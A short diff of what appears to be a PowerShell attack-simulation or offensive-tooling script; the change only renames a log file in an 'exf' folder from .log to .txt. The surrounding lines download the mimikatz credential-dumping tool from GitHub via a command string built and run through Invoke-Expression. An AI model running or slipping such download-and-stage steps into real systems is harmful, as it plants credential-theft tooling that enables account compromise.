@@ -7,7 +7,7 @@ Write-Output "==================================================================
 #
 $DestinationFile = "$env:PUBLIC\Toolz\mimikatz.zip"; 
 $DownloadURL = "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip";
-$exf_file = "$env:PUBLIC\exf\mimi_down_extract.log"; 
+$exf_file = "$env:PUBLIC\exf\mimi_down_extract.txt"; 
 $CompleteCommand = "Invoke-WebRequest" + " $DownloadURL" + " -outfile " + "$DestinationFile";
 Invoke-Expression  "$CompleteCommand";
 if ([System.IO.File]::Exists("$DestinationFile")) { 
